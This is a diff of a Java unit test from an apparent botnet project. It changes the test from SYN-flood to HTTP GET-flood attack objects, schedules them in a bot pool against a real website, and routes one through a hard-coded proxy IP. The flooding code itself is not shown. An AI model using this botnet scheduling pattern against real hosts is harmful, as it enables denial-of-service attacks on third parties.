@@ -26,7 +26,7 @@
 
 package com.acmutv.botnet.core.exec;
 
-import com.acmutv.botnet.core.attack.SynFloodAttack;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
 import com.acmutv.botnet.tool.net.ConnectionManager;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
@@ -38,7 +38,6 @@ import org.quartz.SchedulerException;
 
 import java.net.MalformedURLException;
 import java.net.URL;
-import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
@@ -85,13 +84,13 @@ public class BotPoolTest {
   @Test
   public void test_schedulingAttack() throws SchedulerException, MalformedURLException, InterruptedException {
     Assume.assumeTrue(ConnectionManager.checkConnection());
-    Set<SynFloodAttack> attacks = new HashSet<SynFloodAttack>(){{
-      add(new SynFloodAttack(new URL("http://www.gmarciani.com")));
-      add(new SynFloodAttack(new URL("http://www.gmarciani.com"),
+    Set<HttpFloodAttack> attacks = new HashSet<HttpFloodAttack>(){{
+      add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com")));
+      add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
           new HttpProxy("31.220.56.101", 80))
       );
       add(
-          new SynFloodAttack(new URL("http://www.gmarciani.com"),
+          new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
               new HttpProxy("31.220.56.101", 80),
               3, new Interval(2, 3, TimeUnit.SECONDS))
       );
@@ -101,11 +100,11 @@ public class BotPoolTest {
 
     pool.getScheduler().standby();
 
-    for (SynFloodAttack attack : attacks) {
-      pool.scheduleAttackHttp(attack);
+    for (HttpFloodAttack attack : attacks) {
+      pool.scheduleAttackHttpFlooding(attack);
     }
 
-    List<SynFloodAttack> scheduled = pool.getScheduledHttpAttacks();
+    List<HttpFloodAttack> scheduled = pool.getScheduledHttpAttacks();
     Assert.assertTrue(scheduled.containsAll(attacks));
 
     pool.getScheduler().start();
